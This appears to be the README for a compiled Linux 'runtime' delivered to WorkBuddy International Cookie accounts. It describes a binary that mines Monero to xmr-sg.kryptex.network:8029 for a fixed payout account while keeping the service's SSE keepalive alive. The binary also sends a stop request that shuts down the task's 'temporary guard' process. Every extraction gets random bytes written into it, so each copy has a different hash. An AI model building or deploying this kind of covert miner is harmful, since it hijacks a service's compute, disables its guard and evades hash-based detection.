International Linux x86_64 runtime — 2.3.0-ai-sg1

Keep start, key, data and 1.key together. Start with the existing authorized
console workflow. Runtime Cookie credentials and the package password are
supplied privately; none are embedded in this delivery.

This edition is for WorkBuddy International (.ai) Cookie accounts. It retains
the existing native ACP/SSE keepalive and mines directly over TLS to
xmr-sg.kryptex.network:8029, using the previously configured payout account.
It does not connect to the aggregation proxy. The root repository delivery is
unchanged for existing users and Chinese deployments.

After this launched process has completed its own keepalive handshake and
received two fresh, increasing SSE heartbeats, it writes the existing stop
request for the same task's temporary guard. That guard closes its own stream
and exits. No process-name kill is used. The check reads the actual executable
basename and launch state, so it also works when a future edition is renamed.

The launcher verifies the publisher signature and complete template SHA256
before extracting the final executable as run. Every extraction replaces only
the 54-character field in the non-executable ELF section .agent_instance with
27 cryptographically random bytes encoded as hexadecimal (216 bits).
The surrounding record is ASRUN_INSTANCE_V1:<54 characters>:END_ASRUN_INSTANCE.
run --instance-id prints that field without starting mining or network calls.
There is no identifier registry, per-instance checksum mapping or inventory.
Local randomness makes collisions extremely unlikely; global uniqueness is
not guaranteed. MD5 changes are an incidental effect, not an integrity check.
Do not erase or modify any executable code. For template integrity comparison,
restore only this validated record's 54 hexadecimal characters to ASCII zeros,
then compare the entire file's SHA256 with run_template_sha256 in release.json.

This repository publishes compiled delivery only. No console source, account
credentials, package password or signing seed is included.
